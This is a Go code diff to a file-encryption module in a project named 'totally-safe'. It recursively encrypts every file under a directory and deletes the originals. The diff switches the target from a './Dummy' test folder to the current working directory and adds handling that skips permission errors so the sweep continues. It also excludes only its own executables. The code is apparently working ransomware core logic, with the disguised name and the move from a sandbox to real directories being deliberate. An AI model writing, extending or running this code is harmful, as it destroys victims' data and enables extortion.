@@ -2,13 +2,15 @@ package Crypto
 
 import (
 	"fmt"
+	"github/BryanMwangi/totally-safe/exe/Utils"
 	"log"
 	"os"
 	"path/filepath"
 )
 
 func GetAndEncryptFiles(key string) (bool, error) {
-	startDir := "./Dummy"
+	startDir := Utils.GetCurrentDir()
+
 	err := processDirectory(key, startDir)
 	if err != nil {
 		return false, err
@@ -31,11 +33,19 @@ func EncryptFile(key string, filePath string) error {
 
 	err = os.WriteFile(newFilePath, encrypted, 0777)
 	if err != nil {
+		if os.IsPermission(err) {
+			log.Printf("skipping directory %s due to permission denied error: %v", newFilePath, err)
+			return nil
+		}
 		log.Fatalf("write file err: %v", err.Error())
 	}
 	//delete original file path
 	err = os.Remove(filePath)
 	if err != nil {
+		if os.IsPermission(err) {
+			log.Printf("skipping directory %s due to permission denied error: %v", filePath, err)
+			return nil
+		}
 		log.Fatalf("remove file err: %v", err.Error())
 	}
 
@@ -43,7 +53,7 @@ func EncryptFile(key string, filePath string) error {
 }
 
 func processDirectory(key string, dirPath string) error {
-	if dirPath == "totally-safe" {
+	if Utils.SkipDir(dirPath) {
 		return nil
 	}
 	getFiles, err := os.ReadDir(dirPath)
@@ -66,6 +76,7 @@ func processDirectory(key string, dirPath string) error {
 	}
 	for _, file := range getFiles {
 		filePath := filepath.Join(dirPath, file.Name())
+
 		if file.IsDir() {
 			err := processDirectory(key, filePath)
 			if err != nil {
@@ -86,11 +97,11 @@ func processDirectory(key string, dirPath string) error {
 		} else {
 			if file.Name() == "totally-safe-win.exe" ||
 				file.Name() == "totally-safe-lnx.exe" ||
-				file.Name() == "totally-safe-mc.exe" {
+				file.Name() == "totally-safe" {
 				continue
 			}
-			// fmt.Println(file.IsDir())
-			fmt.Println(filePath)
+			//fmt.Println(file.IsDir())
+			// fmt.Println(filePath)
 			err := EncryptFile(key, filePath)
 
 			if err != nil {
@@ -109,7 +120,7 @@ func processDirectory(key string, dirPath string) error {
 				return err
 			}
 		}
-
 	}
+
 	return nil
 }
